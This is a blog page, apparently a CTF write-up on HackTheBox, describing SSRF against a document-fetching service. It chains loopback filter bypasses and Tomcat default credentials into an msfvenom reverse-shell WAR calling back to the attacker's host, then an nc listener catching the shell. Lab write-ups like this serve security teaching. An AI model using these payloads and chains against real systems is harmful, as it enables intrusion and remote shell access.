@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>HackTheBox: SSRF for Internal Recon | Saketh Reddy</title>
+<link rel="stylesheet" href="blog-style.css"/>
+</head>
+<body>
+<div id="cur"></div><div id="cur-r"></div>
+<canvas id="bg-canvas"></canvas>
+<div id="grain"></div><div id="vig"></div><div id="scl"></div>
+
+<nav class="bnav">
+  <a href="index.html" class="bnav-logo">&gt;_<span>SAKETH</span>.REDDY</a>
+  <a href="index.html" class="bnav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="bhero">
+  <div class="bcat bcat-c">CTF Writeup</div>
+  <h1 class="btitle">HackTheBox: Exploiting <span>SSRF</span><br>for Internal Recon</h1>
+  <div class="bmeta">
+    <span>Jan 15, 2025</span>
+    <span class="bmeta-tag">HackTheBox</span>
+    <span class="bmeta-tag">SSRF</span>
+    <span class="bmeta-tag">Web</span>
+    <span class="bmeta-tag">~12 min read</span>
+  </div>
+  <div class="bhero-line"></div>
+</div>
+
+<div class="bcontent">
+  <p>Server-Side Request Forgery (SSRF) is one of those vulnerabilities that looks simple on paper but opens devastating attack paths when chained correctly. In this writeup, I walk through how I exploited an SSRF vulnerability on a HackTheBox machine to enumerate internal services, pivot into a restricted network segment, and ultimately achieve full compromise.</p>
+
+  <h2>Reconnaissance</h2>
+  <p>Starting with an Nmap scan to identify open ports and services:</p>
+  <div class="cb">
+    <div class="cb-lbl">Terminal</div>
+    <pre>nmap -sC -sV -oN nmap_initial.txt 10.10.11.X
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1
+80/tcp   open  http    nginx 1.18.0
+8080/tcp open  http    Apache Tomcat 9.0.41</pre>
+  </div>
+  <p>The web application on port 80 was a document-fetching service — users could enter a URL and the server would retrieve and render the content. Classic SSRF setup. Port 8080 running Tomcat was interesting but not directly accessible from my IP.</p>
+
+  <h2>Identifying the SSRF Entry Point</h2>
+  <p>Navigating to the application revealed a <strong>"Fetch Document"</strong> feature with a URL input field. My first test was pointing it at my own server to confirm outbound requests:</p>
+  <div class="cb"><div class="cb-lbl">Payload</div><pre>http://10.10.14.5:8000/test</pre></div>
+  <div class="cb">
+    <div class="cb-lbl">Python HTTP Server — Listener</div>
+    <pre>python3 -m http.server 8000
+# Got a hit:
+# 10.10.11.X - - [15/Jan/2025] "GET /test HTTP/1.1" 200</pre>
+  </div>
+  <div class="co co-info">
+    <div class="co-title">ℹ Key Observation</div>
+    <p>The server made an outbound HTTP request from its own IP — confirming SSRF. Now the goal is to redirect that request toward internal resources.</p>
+  </div>
+
+  <h2>Probing Internal Services</h2>
+  <p>With SSRF confirmed, I started probing internal addresses. The <strong>169.254.169.254</strong> cloud metadata endpoint is always worth checking first:</p>
+  <div class="cb"><div class="cb-lbl">Payload</div><pre>http://169.254.169.254/latest/meta-data/</pre></div>
+  <p>No luck — the machine wasn't on a cloud provider. I shifted to enumerating localhost services and common internal ports:</p>
+  <div class="cb">
+    <div class="cb-lbl">Port probing via SSRF</div>
+    <pre>http://127.0.0.1:8080/
+http://127.0.0.1:3306/
+http://127.0.0.1:6379/
+http://127.0.0.1:5000/</pre>
+  </div>
+  <p>The request to <code>127.0.0.1:8080</code> returned the <strong>Tomcat manager page</strong> — only accessible internally. The response included the full Tomcat Manager interface with a visible app list.</p>
+
+  <h2>Bypassing Input Filters</h2>
+  <p>The application had basic filtering — it blocked requests to <code>127.0.0.1</code> directly. I used several bypass techniques:</p>
+  <ul>
+    <li><strong>Decimal IP:</strong> <code>http://2130706433:8080/</code> (127.0.0.1 in decimal)</li>
+    <li><strong>Octal IP:</strong> <code>http://0177.0.0.1:8080/</code></li>
+    <li><strong>IPv6 loopback:</strong> <code>http://[::1]:8080/</code></li>
+    <li><strong>DNS rebinding:</strong> <code>http://localtest.me:8080/</code></li>
+  </ul>
+  <div class="co co-warn">
+    <div class="co-title">⚠ Filter Bypass</div>
+    <p>The IPv6 loopback <code>[::1]</code> worked. The filter only checked for the string "127.0.0.1" — a classic denylisting failure.</p>
+  </div>
+
+  <h2>Accessing the Tomcat Manager</h2>
+  <p>With access to the internal Tomcat Manager via SSRF, I could see deployed applications and attempt to deploy a malicious WAR file. Tomcat Manager default credentials are often left unchanged:</p>
+  <div class="cb">
+    <div class="cb-lbl">Common default creds tried</div>
+    <pre>admin:admin
+tomcat:tomcat
+admin:s3cret
+tomcat:s3cret   ✓ SUCCESS</pre>
+  </div>
+  <p>Authenticated! Now I generated a reverse shell WAR file using msfvenom:</p>
+  <div class="cb">
+    <div class="cb-lbl">Generating the WAR shell</div>
+    <pre>msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f war -o shell.war</pre>
+  </div>
+
+  <h2>Deploying the Shell via SSRF</h2>
+  <p>Deploying a WAR via Tomcat Manager requires a POST request with multipart form data. I crafted this as a SSRF payload through the document fetcher, using a redirect chain:</p>
+  <div class="cb">
+    <div class="cb-lbl">Redirect server (redirect.py)</div>
+    <pre>from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Redirect(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location',
+          'http://[::1]:8080/manager/text/deploy'
+          '?path=/shell&update=true')
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 8888), Redirect).serve_forever()</pre>
+  </div>
+
+  <h2>Getting a Shell</h2>
+  <div class="cb">
+    <div class="cb-lbl">Shell obtained</div>
+    <pre>nc -lvnp 4444
+# Connection received on 10.10.11.X 54312
+# id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)</pre>
+  </div>
+  <div class="co co-ok">
+    <div class="co-title">✓ Initial Access Achieved</div>
+    <p>Running as the <strong>tomcat</strong> service user. From here, privilege escalation to root involved a SUID binary — but that's a story for another writeup.</p>
+  </div>
+
+  <h2>Key Takeaways</h2>
+  <ul>
+    <li>Always test SSRF against internal ports, not just external OOB callbacks</li>
+    <li>Denylist-based filters are weak — IPv6, decimal, and octal encodings almost always bypass them</li>
+    <li>Chain vulnerabilities: SSRF → internal service access → credential reuse → RCE</li>
+    <li>Cloud metadata endpoints and Tomcat/Spring actuators are highest-value internal targets</li>
+    <li>Redirect chains allow turning GET-only SSRF into POST requests</li>
+  </ul>
+
+  <div class="bfooter">
+    <span class="bftag">SSRF</span><span class="bftag">HackTheBox</span><span class="bftag">Web Exploitation</span>
+    <span class="bftag">Tomcat</span><span class="bftag">Internal Recon</span><span class="bftag">WAR Deploy</span><span class="bftag">Filter Bypass</span>
+  </div>
+
+  <div class="bmore">
+    <h3>More Writeups</h3>
+    <div class="bmore-links">
+      <a href="blog-sqli-advanced.html" class="bmore-link">
+        <span class="bml-num">02</span>
+        <span class="bml-title">Advanced SQL Injection: Beyond Basic UNION Attacks</span>
+        <span class="bml-arr">→</span>
+      </a>
+      <a href="blog-wireshark-lateral.html" class="bmore-link">
+        <span class="bml-num">03</span>
+        <span class="bml-title">Wireshark Deep Dive: Detecting Lateral Movement</span>
+        <span class="bml-arr">→</span>
+      </a>
+    </div>
+  </div>
+</div>
+
+<script src="blog-shared.js"></script>
+</body>
+</html>
